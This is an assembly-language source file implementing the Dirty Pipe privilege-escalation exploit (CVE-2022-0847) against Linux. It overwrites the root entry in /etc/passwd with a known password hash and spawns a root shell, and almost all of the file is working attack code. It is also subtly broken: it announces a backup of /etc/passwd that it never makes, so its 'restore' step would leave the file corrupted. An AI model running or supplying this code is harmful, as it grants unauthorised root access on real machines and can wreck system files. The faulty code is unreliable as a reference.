; Linux x86_64 Assembly implementation of the Dirty Pipe exploit (CVE-2022-0847)
; Compile with: nasm -f elf64 exploit.asm && ld exploit.o -o exploit

section .data
    path db "/etc/passwd",0
    backup_msg db "Backing up /etc/passwd to /tmp/passwd.bak ...",10,0
    passwd_path db "/etc/passwd",0
    backup_path db "/tmp/passwd.bak",0
    root_pass db ":$6$root$xgJsQ7yaob86QFGQQYOK0UUj.tXqKn0SLwPRqCaLs19pqYr0p1euYYLqIC6Wh2NyiiZ0Y9lXJkClRiZkeB/Q.0:0:0:test:/root:/bin/sh",10,0
    set_pass_msg db "Setting root password to 'piped'...",10,0
    page_boundary_err db "Sorry, cannot start writing at a page boundary",10,0
    cross_page_err db "Sorry, cannot write across a page boundary",10,0
    open_err db "open failed",10,0
    splice_err db "splice failed",10,0
    write_err db "write failed",10,0
    shell_cmd db "/bin/sh",0
    shell_arg db "-c",0
    restore_cmd db "(echo piped; cat) | su - -c 'echo \"Restoring /etc/passwd from /tmp/passwd.bak...\"; cp /tmp/passwd.bak /etc/passwd; echo \"Done! Popping shell... (run commands now)\"; /bin/sh' root",0

section .bss
    pipe_fds resq 2    ; File descriptors for pipe
    stat_buf resb 144  ; struct stat buffer
    buffer resb 4096   ; General purpose buffer

section .text
global _start

_start:
    ; Print backup message
    mov rax, 1          ; sys_write
    mov rdi, 1          ; stdout
    mov rsi, backup_msg
    mov rdx, 44         ; length
    syscall

    ; Open /etc/passwd for reading
    mov rax, 2          ; sys_open
    mov rdi, passwd_path
    mov rsi, 0          ; O_RDONLY
    syscall
    
    cmp rax, 0
    jl open_error
    mov r12, rax        ; Save fd

    ; Create pipe
    mov rax, 22         ; sys_pipe
    mov rdi, pipe_fds
    syscall
    
    ; Prepare pipe (fill and drain to set PIPE_BUF_FLAG_CAN_MERGE)
    call prepare_pipe

    ; Splice one byte before target offset
    mov rax, 275        ; sys_splice
    mov rdi, r12        ; input fd
    mov rsi, 3          ; offset (just before our target)
    mov rdx, [pipe_fds+8] ; pipe write fd
    xor r10, r10        ; NULL offset
    mov r8, 1           ; length
    xor r9, r9          ; flags
    syscall

    ; Write our payload
    mov rax, 1          ; sys_write
    mov rdi, [pipe_fds+8] ; pipe write fd
    mov rsi, root_pass
    mov rdx, 97         ; length of root_pass
    syscall

    ; Execute shell command to restore backup and get shell
    mov rax, 59         ; sys_execve
    mov rdi, shell_cmd
    push 0              ; NULL terminate argv
    push restore_cmd
    push shell_arg
    push shell_cmd
    mov rsi, rsp        ; argv
    xor rdx, rdx        ; envp = NULL
    syscall

    ; Exit
    mov rax, 60         ; sys_exit
    xor rdi, rdi
    syscall

prepare_pipe:
    ; Implementation of prepare_pipe function
    push rbp
    mov rbp, rsp
    
    ; Get pipe size
    mov rax, 72         ; sys_fcntl
    mov rdi, [pipe_fds+8] ; pipe write fd
    mov rsi, 1031       ; F_GETPIPE_SZ
    syscall
    
    mov r13, rax        ; Save pipe size
    
    ; Fill pipe
fill_loop:
    mov rax, 1          ; sys_write
    mov rdi, [pipe_fds+8] ; pipe write fd
    mov rsi, buffer
    mov rdx, 4096
    syscall
    
    sub r13, 4096
    jg fill_loop
    
    ; Drain pipe
    mov r13, rax        ; Restore pipe size
drain_loop:
    mov rax, 0          ; sys_read
    mov rdi, [pipe_fds] ; pipe read fd
    mov rsi, buffer
    mov rdx, 4096
    syscall
    
    sub r13, 4096
    jg drain_loop
    
    pop rbp
    ret

open_error:
    mov rax, 1          ; sys_write
    mov rdi, 2          ; stderr
    mov rsi, open_err
    mov rdx, 11         ; length
    syscall
    
    mov rax, 60         ; sys_exit
    mov rdi, 1
    syscall
